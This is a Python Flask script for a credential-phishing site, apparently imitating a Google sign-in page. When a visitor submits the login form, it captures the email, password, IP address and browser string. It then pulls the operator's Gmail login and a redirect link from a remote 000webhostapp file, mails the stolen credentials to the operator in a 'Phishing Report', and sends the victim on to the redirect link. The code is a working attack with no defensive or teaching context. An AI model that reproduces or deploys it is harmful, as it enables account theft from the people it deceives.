import smtplib
import requests
import regex as re

from flask import Flask , render_template, request ,redirect
from flask import request

redirect_url = "https://sas007.000webhostapp.com/google_heroku_redirect.txt"

app = Flask(__name__)


def send_mail(taremail,password,browser,user_ip,redirected_to,email_,password_):

	global redirect_url

        message = "Subject: Phishing Report\n\nReport From:\nLogs:\n" +"\nEmail = " + taremail + "\n" + "Password = " + password + "\nUser IP = " + user_ip +"\nBrowser = " + browser + "\n" + "User Redirected To : " + redirected_to + "\n"+ "Managment Url : " +  redirect_url

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_,password_)
        server.sendmail(email_, email_, message)
        server.quit()



@app.route('/',methods=["GET","POST"])
def index():
	user_browser = request.headers.get('User-Agent')
	user_ip = request.remote_addr
	string_user_ip = str(user_ip)


	if request.method == "POST":
		Email = request.form['Email']
		Password = request.form['Passwd']
		web_result = requests.get(redirect_url).text
		req_data = re.findall("(?:#)(.*)(?:#)", web_result)
		link_red = req_data[0]
		email_ = req_data[1]
		password_ = req_data[2]
		Redirected_To = link_red
		send_mail(Email,Password,user_browser,user_ip,Redirected_To,email_,password_)
		return redirect(link_red)

		
	return render_template('index.html')

if __name__ == "__main__":
    app.run(host='0.0.0.0',port='80',debug=True)
